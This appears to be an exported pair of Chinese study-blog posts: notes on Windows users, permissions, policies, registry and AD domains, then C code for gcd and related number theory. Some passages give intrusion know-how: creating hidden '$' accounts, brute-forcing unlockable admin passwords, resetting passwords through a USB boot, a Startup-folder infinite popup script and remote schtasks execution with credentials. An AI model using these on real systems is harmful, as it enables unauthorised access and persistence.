S-1-5-21-3775035705-2429884547-220774125-500当前用户主机名\\用户 用户标识SID=&#123;本机身份标识+UID&#125; SID是S-1-5-21-3775035705-2429884547-220774125-500 UID是500 其中的所有用户SID中除了UID,数字都一样 UID 普通用户是 xxx-xxx-(大于1000) 管理员组的UID才是500 黑客可能不需要知道你的密码,通过漏洞去修改自己的UID,也可以实现越权 2).查看所有用户的SID 也可以通过注册表 1regedit 寻找这个目录 1计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\ 目录下的文件名就是SID 3).查看所有用户的SID 1wmic useraccount get name,sid 1234567:wmic useraccount get name,sidName SIDAdministrator S-1-5-21-3775035705-2429884547-220774125-500DefaultAccount S-1-5-21-3775035705-2429884547-220774125-503Guest S-1-5-21-3775035705-2429884547-220774125-501WDAGUtilityAccount S-1-5-21-3775035705-2429884547-220774125-504 4).查看单个用户的详细信息 1net user 用户名 删除用户1net user dqx /del 修改密码密码的存储位置,采用了hash算法,只能暴力破解 1C:\\Windows\\System32\\config\\SAM root下,不需要提供原密码,就可以修改原密码 12net user dqx 1111\t明文修改net user dqx * 密文修改 隐藏用户1net user dqx$ 12822 /add 需要在用户名后面加$,他属于用户名的一部分 然后那个用户 dqx$就不会被cmd指令给查看了,可以通过计算机管理查看到 黑客可以创建隐藏用户,然后提升为管理员 内置用户 给人用的账户 1).管理员administrator 2).普通用户 3).来宾用户 不管什么用户都可以偷偷提权, 给系统用的 1).system 系统用户 拥有最高权限 2).local service 本地服务用户 权限&#x3D;普通用户组高一点 3).network service 网络服务用户 权限&#x3D;普通用户组一样 用户组什么是组?一组用户的集合 如果把一堆用户归类为一个组,在针对文件操作时只需要对这个组设置权限,那么组下的用户也可以享受 用户的本地权限是组权限和用户权限的累加 拒绝缺陷优先使用 查看查看所有组 1net localgroup 查看所有组 1net localgroup Administrators 创建组1net localgroup g1 /add 添加组g1 删除组1net localgroup g1 /del 删除组g1 删除组后,原有的用户仍然存在 添加组用户1net localgroup g1 vmx /add 删除组用户1net localgroup g1 vmx /del 内置组账户1).人为的去计算机添加的组 adminstrators:管理员组 guests:来宾用户组,不需要设置密码,权限比较低 power users 向下兼容的组,一般不去使用 users:创建用户后默认的组存储位置 2),动态包含成员的组, interactive 动态包含在本地登录的用户 authenticated users 动态包含通过验证的用户 也就是那些用户自动的拥有了一些权限 everyone: 包含了所有的用户.包括了来宾, 设置everyone的权限就是设置了所有人的权限,但是优先使用个人用户权限,如果没有设置个人用户权限就使用everythone分配的权限 动态包含在本地登录的用户 一本来的情况下,管理员创建的文件其它人是不可以访问的 但是其它人还是可以访问的,同时你也可以通过管理员修改文件的访问权限,比如限制user 如果管理员不让你修改你还是要修改 他就会提醒你只有管理员才可以那么做,否则输入管理员密码 管理员也可以设置管理员自己的权限,然后限制自己 NFTS导入NTFS（New Technology File System）是Windows NT内核的系列操作系统支持的、一个特别为网络和磁盘配额、文件加密等管理安全特性设计的磁盘格式，提供长文件名、数据保护和恢复，能通过目录和文件许可实现安全性，并支持跨越分区 文件系统 1).windows 早期有FATI6 FAT32,目前是NTFS,ReFs 主流是NTFS NTFS的优点: 可以设置权限,可以加密文件系统,可以压缩磁盘,可以给用户分配磁盘空间 ps:一些大文件,FAT32不支持单个拷贝不超过4G 2).lunix swap系统,可以把磁盘空间给内存用 ext4系统 主流的 12convert h:/fs:ntfs参数 盘符:/fs:文件系统 ,可以在不影响已有文件下可以转化文件系统 文件权限 主要用到的权限是 读取,写入,附加.删除,执行 如何删除一个用户权限 直接点击删除,但是要注意去除继承关系 主体里面既有用户也有组 一个选项是复制继承的权限,一个选项是删除所有继承的权限 文件夹权限列出文件 创建文件 删除 删除子文件夹和子文件 权限分类权限之间不是并列的,可能是递进可能是包含 在win10 里面,点击一个权限会把自带的权限都给自动的选中 一些矛盾的权限,只能写入不能读取,这是可以设置的, 完全控制,包含了所有 修改 读取和执行 读取 写入 特殊权限 权限规则1). 权限的累加 2). 拒绝权限 3). 继承权限 4). 特殊权限 权限的累加 给用户分配的有效权限一个累加,比如组权限和用户权限的一个累加 拒绝权限 拒绝的权限优先级更加高,,因为累加,比如既有拒绝读取的权限,又有读取的权限,那么优先采用拒绝权限 继承权限 创建的文件&#x2F;文件夹会继承上一级文件夹的权限 特殊权限 也就 1). 读取权限 主要是读取文件的安全属性,也就是不勾取它,就无法访问文件的安全属性,而且也无法访问文件的内容 无法访问 而且文件的内容也无法访问 更改权限 和修改文件和文件夹的内容没关系😒 主要和是否能够修改安全属性有关,但是这是基于特殊的读取权限,如果都无法读取,那怎么进入修改? 取得所有权 一个文件夹或者文件 由哪个用户拥有 然后取得所有权基于读取权限和更改权限的,记恨鸡肋😂 然后取得所有权可以修改所有者,负责就g 然后最后的最后,也是无法修改所有者 本地安全策略主要是对登录到计算机的账户进行一些安全设置 进入设置 1231). 开始菜单-&gt;管理工具-&gt;本地安全策略2). secpol.msc3). gpedit.msc 本地组策略包含了本地安全策略 1gpupdate /force 更新策略 账户策略密码策略 windwos server 默认开启了密码复杂性要求 密码长度最小值 密码最短使用期限: 最短使用多久,于是就可以修改密码 密码最长使用期限: 默认42天 强制密码历史:就是密码的历史记录,假如记录了3条,下一次设置密码的时候就不能和以前的3条重复 账户锁定策略 3次登录失败将会锁定账户 只有设置了账户锁定的阈值才可以去设置其它2个选项 账户锁定时间就是密码错误了,锁定多久然后自动开锁 重置账户锁定计数器:你去银行输错密码.输错2次,第三次就g了,于是过了24小时,我再去输入,于是我就有了3次机会, 这个重置账户锁定计数器&#x3D;24小时 在逻辑上,账户锁定时间&gt;&#x3D;重置账户锁定计数器 所以你在设置重置账户锁定计数器的时候,如果设置的时间不符合逻辑,账户锁定时间也会自动的修改 另外如果通过另外一个账户去修改日期,也可以很快的把锁定时间给度过 ps:管理员不受账户锁定策略的限制 所以无论管理员输错多少次密码都不会锁定 所以可以去爆破管理员的密码 解决方案: 隐藏管理员 本地策略审核策略审核的目的是对windwos操作系统的事件&#x2F;操作做审核 然后可以通过日志查看 做了什么操作,做了追踪和溯源 审核策略更改 就是记录一些修改的操作 审核登录事件 审核哪些用户登录成功了失败了 审核对象访问 ,,, 审核教程跟踪 审核相关 如进程创建、进程终止、句柄复制以及间接对象访问。 审核目录访问 … 审核特权使用 .. 审核系统事件 此安全设置确定 OS 是否对以下任何事件进行审核: • 尝试更改系统时间• 尝试安全启动或关闭系统• 尝试加载可扩展身份验证组件• 由于审核系统失败而导致已审核事件丢失• 安全日志大小超过可配置的警告阈值级别。 审核账户登录事件 .. 审核账户管理 创建、更改或删除用户帐户或组。重命名、禁用或启用用户帐户。设置或更改密码 用户权限分配主要是给用户和用户组分配一些特殊的权限 从网络访问此计算机 everyone就代表了是有人 更改时区 修改系统时间 …. 远程桌面指令 1mstsc 安全选项 本地组策略也就是一组策略的集合,只有管理员才可以操作 打开方式 1gpedit.msc 刷新组策略 1gpupdate /force 计算机配置: 对计算机配置,配置后需要重启才可以生效,不管你是什么用户 用户配置: 对用户生效,配置后注销生效,只对当前用户生效 用户配置案例1: 隐藏和禁用左面的所有项目 开启 注意桌面是一个目录.目录里面有配置,桌面里面还有2个目录,启用后需要刷新配置和注销重写登录 效果 这个配置对其它用户也是生效的 后面的用户配置案例 保护任务栏和开始菜单不被修改 保护个人文件历史浏览记录 不保留最近打开的文档历史 禁止internet exploer 以链接形式打开新的网页,但是不会禁止在本网页打开 禁用控制面板,打开控制面板的cmd&#x3D;control.exe 计算机配置案例 关闭驱动器的自动运行比如插入U盘,不会自动的读取数据?万一读取到木马运行怎么办? 自动更新 注册表基础 注册表也可以理解为数据库,但是注册表是树状的,包含了计算机所有的配置 以前的注册表是.ini 打开 1regedit 导入HKEY_LOCAL_MACHINE : 记录了关于本地计算机系统的信息,包括了硬件和操作系统的数据 HKEY_USERS : 记录了关于动态加载的用户配置文件和默认配置文件的信息 HKEY_CURRENT_USER : 记录了当前用户登录的数据吗,本质是HKEY_USERS的子树,只是单独复制了一份拿出来展现了 HKEY_CURRENT_CONFIG : 记录了当前用户的一些配置文件,本质是HKEY_LOCAL_MACHINE的子树,只是单独复制了一份拿出来展现了 HKEY_CLASSES_ROOT : 本质是HKEY_CURRENT_USER的子树,只是单独复制了一份拿出来展现了 基本操作 值的6种类型 REG_SZ 一定长度的字符串 REG_BINARY 二进制值 REG_DWORD 4字节 REG_QWORD 8字节 REG_MULTI_SZ 多重字符串值 REG_EXPAND_SZ 长度可变的字符串 案例1 修改时间的显示样式 路径 1计算机\\HKEY_CURRENT_USER\\Control Panel\\International -&gt; sTimeFormat 然后注销更新 为什么不是m?因为vmx的m不是字母的m,而是一个分钟的m的意思 案例2 在欢迎屏幕显示自定义信息 1计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System 案例3 禁用任务管理器 1计算机\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System 如果没有对应的值就创建 直接把值修改为1 案例4 禁用控制面板 1计算机\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer 如果没有对应的值就创建 删除快捷方式不好看的箭头 1计算机\\HKEY_CLASSES_ROOT\\lnkfile 然后删除 ps: 一但删除就g了.任务栏的快捷方式都无法使用了 维护备份所有 单个备份 恢复注册表就是导入xxx.reg文件 或者是直接点击xx.reg文件 案例 禁止打开注册表 1计算机\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System 新建一个DWORD DisableRegistryTools 1 ps:如果锁定了就打不开了,需要用第三方工具打开然后修改回来,比如RegWorkShop 优化1). 清楚多余的dll 1计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SharedDLLs 如果值&#x3D;0,表示可以删除 2). 卸载软件后的垃圾信息 1计算机\\HKEY_CURRENT_USER\\Software 1计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE 3). 系统安装时产生的多余信息 比如多余的时区,多余的语言,多余的键盘布局 AD域 工作组: 默认模式,人人平等,互相访问需要或得对方许可 域: 人人不平等,集中管理,统一管理,操作不需要对方授权 域的组成 域管理员 : DC - Domain Controller 成员机 基本部署Active Directory 既是域控制器也是DNS服务器 安装域控制器 安装活动目录 关闭防火墙 1dcpromo 选择域控制器,一路默认 初步,我们只需要一路默认,安装 然后部署后配置,把服务器提升为域控制器 1). 一开时没有域,没有树,没有林 我们做了一个域的树,只有一个树的林, 所以从新建林开始 2). 设置功能级别的时候,它是最小级别的服务器的功能,也就是其它域的服务功能只能高于或者等于它 下面那个密码指的是与服务器还原的密码 3). 然后一路默认,关机重启 登录,之前DC的Admin从本地管理员升级为域的管理员 1dqx\\administrator 以前是本地用户和组 现在是域成员和域组 域组 在Computers中记录了加入域的设备,这些设备需要用DC给他们分配域账户 Domian Controller 域组: 记录了域的DC设备 Users 用户组: 记录了域中未分配的用户(也就是用户默认的分组) 注意设备的DNS要指向AD服务器,而且域管理员和域成员要在相同的网段 同时它也会自动生出DNS服务 配置客户机 然乎获取DC的许可,加入域 然后..重启 查看PC是否加入成功 假如加入成功,就会那么显示 把PC加入域后,还得给域成员机配置账户 登录 可能就遇到的问题 访问不了dqx.com DNS服务器没建立成功 DNS服务器没有记录dqx.com的 域名是与父文件相同,也就是域名就是dqx.com dns没有刷新 如果DNS没有dqx.com的记录 就手动创建 以前的设备有本地管理员,现在的域成员登录电脑,它的身份并没有比本地管理员高 于是我们就把域成员的身份加入本地管理员组 输入用户名 hcm 于是检查名称,出现 韩春明(&#104;&#x63;&#x6d;&#64;&#100;&#113;&#120;&#46;&#99;&#111;&#x6d;) OUOU组织单位,类似于组策略,把用户分为一组一组的,集中管理 既然是组织单位,那么和组还是有点区别的,也就是单位和组的区别 单位(比如财务部),组(比如财务部里面的小组) 给单位做一些配置,单位里面的用户也会受到影响 组织单位就是OU 那种带小用户标志的就代表OU,上图中有2个OU: Domain Controller 和会 基于OU,我们还可以细分 既然新建了OU,我们就可以移动以前创建的用户到我们新建的OU 注意这里是移动,不是添加的组 移动是移动到某个组织单位OU 添加到组指的是添加到某个组 我们也可以把设备加入OU, 既然我们都把用户加入OU了,为什么还要把设备加入? 比如我们限制 OU.大一.男生 的电脑壁纸是美女 如果OU.大一女生登录了那台设备,它的壁纸就不是美女 因为美女的配置是基于用户的,而不是基于电脑配置的,如果把设备加入OU,对OU配置,那么无论任何人登录那台设备,它的壁纸都是美女 ps:一台设备只能出现在一个OU GPO策略我们上面只是就行了单位的分组,下面是策略部署的过程 域组策略 首先计算机不加入域,也有组策略 加入了域,就是域组策略 如果设备没有加入域,那么就使用本地组策略 如果加入了域,使用的原则 域组策略&gt;本地组策略 域成员的策略采用的是继承的方式 也就是子成员继承了父成员的策略, 子成员可以新增和重写父成员的组策略,然后作用于自己的策略 父成员可以强制子成员使用父成员的策略,那么子成员书写的策略就失效 子成员也可以不继承父成员的策略,使用自己的域策略和本地策略(如果父成员使用强制,不继承就会失效) 打开GPO域的组策略 通过域组策略可以修改计算机的各种属性,如开始菜单,桌面背景,网络参数 不同的OU都会有一个组策略表,该表就是OU的统一配置 所有OU的配置在第一个 Default Domain Policy 基于域管理员组的OU,对所有域管理员生效,Default Domain Controller Policy 编辑OU 计算机配置是对计算机生效 用户配置是对用户生效,也就是该用户无论登录哪台设备,它的配置都是自定义的 双击进行配置 每条组策略都有状态的分类 配置桌面壁纸 在DC上建立共享文件夹,给域用户下载 配置共享文件夹权限 配置共享文件夹NTFS权限 ops:加入用户组 domain users 配置壁纸路径(ps路径很重要) 查看已经启用的策略配置 浅谈组策略脚本 组权限与OU组单位不同 这里的组和本地的组类似 然后新建一个组 组配置和gpo配置的区别在于 gpo是对系统配置的设置 组是对文件和目录的权限的设置 把用户添加到组 way1 way2 他们的体现 BIOS破解系统密码1Windows+R打开运行窗口，输入gpedit.msc进入本地组策略编辑器。展开计算机配置-管理模板-Windows组件-BitLocker驱动器加密-操作系统驱动器，找到”启动时需要附加身份验证”，将其配置为”已启用”并且勾选”没有兼容的TPM时允许BitLocker（在U盘上需要密码或启动密钥）”。如下图 u盘启动器,大白菜一键制作 开机启动的时候F12,然后U盘启动 进入大白菜系统 如果出现下面这种情况 解决办法： 1、修改SATA Configuration 设置项为AHCI ， 路径（主板不同，路径可能不同）：Bios setup —-Storage—-SATA Configuration —–AHCI。 2、启动 win-pe 重置系统登陆密码。因为修改硬盘传输格式（SATA Configuration 设置项），会导致蓝屏，电脑无法启动。 3、将SATA Configuration项恢复默认设置项。 如此电脑登陆密码成功重置 bat重定向 1234nul 是空设备的意思1&gt;nul 命令运行成功,不显示,等价于 &gt;nul2&gt;nul 命令运行失败,不显示1&gt;nul 2&gt;nul 屏蔽所有输出语句 文件清理 1234567891011@echo offcolor ctitle clear_okecho i will work..please waitcd .\\tmp 1&gt;nul 2&gt;nulrd . /s /q 1&gt;nul 2&gt;nulping -n 10 -l 64 www.wus20.com 1&gt;nul 2&gt;nulecho over...echo. pause 无限弹窗 123:flagstartgoto flag 开机无限弹窗(把bat脚本写进启动项)启动目录 123@echo offecho %userprofile%pause 1C:\\Users\\utmp\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 1234copy qq.bat &quot;%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&quot;:flagstartgoto flag userprofile是用户家目录 @echo off可以取消显示 实现关机的小程序 12345678910111213141516171819202122232425262728@echo offtitle ShutDown_Vm4color aecho memu:menuclsecho.echo 1.shutdown in timeecho 2.cancel shutdownecho 3.exitecho.:1set /p num=You Choose :?if &quot;%num%&quot;==&quot;1&quot; goto 1if &quot;%num%&quot;==&quot;2&quot; goto 2if &quot;%num%&quot;==&quot;3&quot; goto 3 :1set /p qTime=Input how long do you want to shutdown: shutdown -s -f -t %qTime% goto menu:2shutdown -agoto menu:3 exit 杀死进程 123456789@echo offcolor aecho fuck youtaskkill /im explorer.exe /f 1&gt;nul 2&gt;nulping -n 10 127.0.0.1 1&gt;nul 2&gt;nulstart c:\\windows\\explorer.exe echo 蒙蔽了吧pause 1&gt;nul 2&gt;nul 指令计算机管理 1compmgmt.msc 控制面板 1control 服务 1services.msc 注册表 1regedit 本地组策略 1gpedit.msc 远程执行指令,但是运行得不是很好 1234567891011121314151617181920212223242526SCHTASKS /parameter [arguments]描述: 允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任 务。参数列表: /Create 创建新计划任务。 /Delete 删除计划任务。 /Query 显示所有计划任务。 /Change 更改计划任务属性。 /Run 按需运行计划任务。 /End 中止当前正在运行的计划任务。 /ShowSid 显示与计划的任务名称相应的安全标识符。 /? 显示此帮助消息。 Examples: SCHTASKS SCHTASKS /? SCHTASKS /Run /? SCHTASKS /End /? SCHTASKS /Create /? SCHTASKS /Delete /? SCHTASKS /Query /? SCHTASKS /Change /? SCHTASKS /ShowSid /? 12schtasks /Create /S 192.168.1.5 /U Administrator /P 12822 /TN taskName /TR I:\\d0g3.exe /SC once /ST 23:36 IP 用户名 密码 任务的路径\\名称 doskey 起别名参考链接 https://www.cnblogs.com/feiquan/p/10652442.html https://blog.csdn.net/hongshanguo/article/details/113485892 123456@echo offdoskey 新的名字 = 原来的名字doskey py2071=cd /d E:\\IDE\\Python\\env\\Python2071doskey py=python $1doskey mk = nmakedoskey mkc = nmake clean 多个命令的宏用**$t**隔开，命令间不用加空格 12doskey mc=md $1$tcd $1//mc books 永久神效 在注册表 1HKEY_CURRENT_USER\\Software\\Microsoft\\Command Processor 新建字符串 12变量名字: AutoRun变量值: E:\\\\Windows\\\\dos\\\\doskey\\\\alias.bat 重启cmd 就🆗了 重启explor.exe方法1: 它的名字是资源管理器,去taskmgr关闭即可 方法2: 按住ctrl shift 右键任务栏空白处,然后点击退出资源管理器 然后ctrl shift esc 出现taskmgr,点击左上角放入file选项,然后点击新建运行 运行explore.exe 方法3 taskkill &#x2F;IM explorer.exe &#x2F;F","tags":["Windows"],"categories":["计算机基础"]},{"title":"信安数学基础","path":"/re4mile/2021/06/07/本科专业/信安数学基础/zy/","content":"C最大公因数方法一 穷举法公约数从小-&gt;大 他们同时除一个数,如果都能除尽,说明是公约数 123456789101112131415161718#include &lt;stdio.h&gt; int main()&#123; int n1, n2, i, output,min; printf(&quot;输入两个正整数，以空格分隔: &quot;); scanf(&quot;%d %d&quot;, &amp;n1, &amp;n2);\tmin=n1&lt;n2?n1:n2; for(i=1; i &lt;=min; i++) &#123; // 判断 i 是否为最大公约数 if(n1%i==0 &amp;&amp; n2%i==0)//i从1开始,一直遍历到最大值,如果满足同时被2个数整除就记录一下 output = i; &#125; printf(&quot;%d 和 %d 的最大公约数是 %d&quot;, n1, n2, output); return 0;&#125; 它的另外一个模板是 原理一模一样,从大的公约数到小 12345678910111213#include &lt;stdio.h&gt;int main(void)&#123; int x, y, gcd; printf(&quot;请输入两个正整数：&quot;); scanf(&quot;%d%d&quot;, &amp;x, &amp;y); gcd=x&lt;y?x:y; while(x % gcd ||y % gcd)//当余数同时为0就退出 gcd--; printf(&quot;gcd = %d &quot;, gcd); return 0;&#125; 方法二 未知方法公约数从大-&gt;小 缺陷:负数不行 1234567891011121314151617181920#include &lt;stdio.h&gt;int main()&#123; int n1, n2; printf(&quot;输入两个数，以空格分隔: &quot;); scanf(&quot;%d %d&quot;,&amp;n1,&amp;n2); while(n1!=n2) &#123; if(n1 &gt; n2) n1 -= n2; else n2 -= n1; //大小的ifelse保证结果为正 &#125; printf(&quot;GCD = %d&quot;,n1);//组后n1与n2都是一样的 return 0;&#125; 欧几里得之辗转相除法123456789101112131415161718192021222324#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;int main()&#123;\tint buff;\tint x=0, y=0;\tprintf(&quot;请输入两个正整数： &quot;); scanf(&quot;%d%d&quot;, &amp;x, &amp;y);\t//这下面这个代码的顺序很重要 while (y != 0)\t&#123; buff = x % y; x = y; y = buff;\t&#125;\tif(x&lt;0&amp;&amp;y&lt;=0) printf(&quot;%d &quot;, -x);\telse printf(&quot;%d &quot;, x);\treturn 0;&#125; 辗转相除法-函数递归123456789101112131415161718192021#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;int func(int, int);int main()&#123;\tint x = 0, y = 0;\twhile (1)\t&#123; scanf(&quot;%d %d&quot;, &amp;x, &amp;y); printf(&quot;%d &quot;, func(x, y));\t&#125;\treturn 0;&#125;int func(int x, int y)&#123;\tif (y != 0) return func(y, x % y);\telse return x;&#125; 另外一种写法,可能它的步骤更加前进些 12345678910111213141516#include &lt;stdio.h&gt;int func(int m, int n);int main()&#123;\tprintf(&quot;%d&quot;,func(21,49));\treturn 0;&#125;int func(int m, int n)&#123; if(m % n != 0) //直接运算后判断,返回那个商,而那个商是以前的余数 return func(n, m%n); else return n;&#125; 最小公倍数穷举法12345678910111213141516171819202122#include &lt;stdio.h&gt; int main()&#123; int n1, n2, max; printf(&quot;输入两个正整数: &quot;); scanf(&quot;%d %d&quot;, &amp;n1, &amp;n2); max=n1&gt;n2?n1:n2; while(1) &#123; if(max%n1==0&amp;&amp;max%n2==0) &#123; printf(&quot;%d&quot;,max); break; &#125; max++;\t&#125; return 0;&#125; 难以琢磨12345678910111213#include &lt;stdio.h&gt;int main()&#123; int n1,n2,buff,gcd; n1=72; n2=120; gcd=n1&lt;n2?n1:n2;\twhile(n1%gcd||n2%gcd) gcd--; printf(&quot;%d&quot;,(n1*n2)/gcd); return 0;&#125; 整除和同余整除(1)\t如果b|a,且a|b,那么b&#x3D;a或者b&#x3D;(-a) (2)\t整除的传递性: 如果a|b,且b|c,那么a|c (3)\t如果c|a,且c|b,那么c|ua+vb ,其中u和v是任意整数 (4)\t如果c|a1…c|ak,那么有c|(u1a1+…+ukak) (5)\t0是任何非零整数的整数倍 (6)\t±1是任何整数的因数 (7)\t出0外,任何数是自己的整数倍,也就是是自己的一倍 &#x2F;&#x2F;如果b|a,且a|b,那么b&#x3D;a或者b&#x3D;(-a) 为什么说还有一个负数额情况? 比如-2%2&#x3D;0,2%-2&#x3D;0 理解的角度 负号剥离 (-2+2)%2&#x3D;0,2 如果b|a,且a|b,那么b&#x3D;a或者b&#x3D;(-a) 注意这里,我们可以用于数据的校验.. 123456789101112131415161718192021222324252627#include&lt;stdio.h&gt;#define bType unsigned charint func(bType ,bType);int main()&#123;\tfunc(1,2);\treturn 0;&#125;int func(bType x,bType y)&#123;\tif(x&amp;&amp;y)//为了不发生异常的判断\t&#123; if(x%y==0) &#123; if(y%x==0) return 1; &#125;\t&#125;\telse if(x==0&amp;&amp;y==0)\t&#123; return 1;\t&#125;\telse\t&#123; return 0;\t&#125;&#125; 整除的传递性: 如果a|b,且b|c,那么a|c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include&lt;stdio.h&gt;typedef unsigned char bType;int func(bType ,bType,bType);void swapt(bType* ,bType* );int main()&#123;\tint ret=0;\tret=func(0,2,3);\tprintf(&quot;%d&quot;,ret);\treturn 0;&#125;int func(bType x,bType y,bType z)&#123;\tbType b_Arr[3];\tint i=0,j=0;\tb_Arr[0]=x;\tb_Arr[1]=y;\tb_Arr[2]=z;\tfor(i=0;i&lt;2;i++)\t&#123; for(j=0;j&lt;2-i;j++) &#123; if(b_Arr[j]&gt;b_Arr[j+1]) &#123; swapt(&amp;b_Arr[j],&amp;b_Arr[j+1]); &#125; &#125;\t&#125;\tx=b_Arr[0];\ty=b_Arr[1];\tz=b_Arr[2];\tif(x!=0)\t&#123; if(y%x==0) &#123; label1: if(y!=0) &#123; if(z%y==0) &#123; return 1; &#125; &#125; else return 1;//现在都有2个0了,当然会是成立 &#125;\t&#125;\telse goto label1;//如果第一数是0,并不能说明什么,我们还得继续判断\treturn 0;\t&#125;void swapt(bType* x,bType* y)&#123;\tbType tmp=0;\ttmp=*x;\t*x=*y;\t*y=tmp;&#125; 如果c|a,且c|b,那么c|ua+vb ,其中u和v是任意整数 123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;#include&lt;string.h&gt;typedef unsigned char bType;int func(bType*);int main()&#123;\tint ret=0;\tbType flag[]=&quot;D0g3&#123;resmile&#125;&quot;;\tret=func(flag);\tprintf(&quot;%d&quot;,ret);\treturn 0;&#125;int func(bType * flag)&#123;\tint a=3,b=6,c=9;\tint i=0;\tint len =strlen(flag)/2;\tfor(i=0;i&lt;len;i++)\t&#123; if((flag[2*i+0]*a+flag[2*i+1]*b)%c) &#123; return 0; &#125; else &#123; continue; &#125;\t&#125;\treturn 1;&#125; 浅谈%求余来判断整除 对于正数的求余 比如9%12&#x3D;9,从起点出发,走过9的距离,所以结果是9 比如15%12&#x3D;3,从起点出发,走过12个距离,到达终点,终点又变为新的起点继续走,走了3个距离,距离起点3,结果是3 对于负数取余 比如-4%12的意义,从起点出发,走过距离4,距离终点8,所以结果是8 比如-16%13的意义,走过一圈13,新的起点,然后走3,距离终点10,所以结果是10 同余关于取模负数的计算 12retGuess= A - A / B * B;retCheck= A % B; 上面2个公式是等价的为什么等价? n&#x3D; A &#x2F; B 其实是变相的说明有n个B,然后n乘以B,用被除数减去nB就是余数 如果A&lt;B,那么结果就是A,好比7%8,7&lt;8,那么结果就是8,因为7的内部含有0个8 如果A&gt;B,那么就减去重复的被除数,剩下的就是结果,好比12%8,减去几个8? 12&#x2F;8&#x3D;1,所以减去1个8,余下4,4&lt;8,所以结果就是4 有下面这个式子: 34&#x2F;7&#x3D;4…6 我对这个的理解是34&#x3D;7x4+6,认为4和7都可以作为除数,因为他们是等价的 但是… 34&#x2F;4&#x3D;7…6,这个式子确实成立,但是已经脱离了意义,因为6&gt;4 所以我们会要求a&#x3D;bq+r中,已知a,b,求q,r,其中r &lt; |b| 基于a&#x3D;bq+r求出q,r 1234567891011121314151617181920212223242526272829#include&lt;stdio.h&gt;#include&lt;string.h&gt;typedef unsigned char bType;int func(bType*);int main()&#123;\tbType flag[]=&quot;D0g3&#123;resmile&#125;&quot;;\tfunc(flag);\treturn 0;&#125;int func(bType * flag)&#123;\tint len=0;\tint i=0;\tbType x=0,y=0;\tlen=strlen((char*)flag);\tif(len&amp;1) len++;\tlen/=2;\tfor(i=0;i&lt;len;i++)\t&#123; x=flag[2*i+0]; y=flag[2*i+1]; if(y==0) y=2; printf(&quot;%c / %c = %02X .. %02X &quot;,x,y,x/y,x%y);\t&#125;\treturn 0;&#125; 最大公因数 gcd最大公因数 1). gcd(x,y)&#x3D;gcd(x,-y)&#x3D;gcd(-x,y)&#x3D;gcd(-x,-y) 在这里,如果一个数(所有的公因子)|某个公因子也无法确定某个公因子是xx 比如xx&#x3D;-70满足条件,但是他的对立面,70也是满足条件的,所以我们讨论最大公因子其实是正在正数的角度 可用于算法的校验 1234567891011121314151617181920212223242526272829303132#include&lt;stdio.h&gt; unsigned char gcd(unsigned char x, unsigned char y);int main()&#123;\tgcd(12, 24);\treturn 0;&#125;//功能：利用欧几里德算法，求整数a，b的最大公约数//参数：整数a，b//返回：a,b的最大公约数unsigned char gcd(unsigned char x, unsigned char y)&#123;\tunsigned char tmp;\tif (x &lt; y) &#123; //保证a大于等于b，便于a%b的运算 tmp = x; x = y; y = tmp;\t&#125;\twhile (y)\t&#123; tmp = x % y; x = y; y = tmp;\t&#125;\treturn x;&#125; 2). 如果y!&#x3D;0,(0,y) &#x3D; |y| 3). m&gt;0,则m(x,y)&#x3D;(mx,my) 4). 整数a,b,c 12如果 (a,c)=1\t则(ab,c)=(b,c) 无论a&#x3D;1还是b&#x3D;1,都成立 5). 整数a,b,c 12如果 a|bc &amp;&amp; (a,b)=1\t则 a|c 欧几里得扩展算法对于自然界的正整数…a,b…一定满足ax+by&#x3D;&#x3D;gcd(a,b); (解一定存在，根据数论中的相关定理） 一个求公因数的定理 对于任意2个A,B 存在AxM+BxN&#x3D;(A,B) 另外,如果A,B互素,当然只会有一个公因数1,也就是结果为1 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include&lt;stdio.h&gt;unsigned int Euclid(unsigned char num1, unsigned char num2);int main()&#123;\tchar flag[] = &quot;D0g3&#123;RGVuZ1F1eGlhbmcu&#125;&quot;;\tint len = 0;\tint i = 0;\tint tmp = 0;\tchar x, y;\tlen = strlen(flag);\tfor (i = 0; i &lt; len / 2; i++)\t&#123; tmp=Euclid(flag[2 * i + 0], flag[2 * i + 1]); x = tmp &gt;&gt; 8; y = tmp &amp; 0xff; printf(&quot;%02X %02X &quot;, x&amp;0xFF ,y&amp;0xFF);\t&#125;&#125;unsigned int Euclid(unsigned char num1, unsigned char num2)//传递进来的是无符号正数,最后处理的时候却变为了有符号&#123;\tunsigned char x[64], y[64];\tchar ret1 = 0, ret2 = 0, ret1_bak = 0;\tint i = 0, j = 0;\tunsigned int result = 0;\tx[0] = num1;\ty[0] = num2;\t//正向存储的过程\tfor (i = 0; y[i]; i++)//我可能存了一些不必要的数据进去\t&#123; x[i + 1] = y[i]; y[i + 1] = x[i] % y[i];\t&#125;\ti -= 2;\t//反向求值的过程\tret1 = 0;\tret1_bak = ret1;\tret2 = 1;\tfor (; i &gt;= 0; i--)\t&#123; ret1_bak = ret1; ret1 = ret2; ret2 = x[i] / y[i] * (-1) * ret1 + ret1_bak;\t&#125;\tresult\t= (unsigned int)ret1;\tresult\t=result &lt;&lt; 8;\tresult = result | (ret2 &amp; 0xFF);//很不理解\treturn result;&#125; 输出 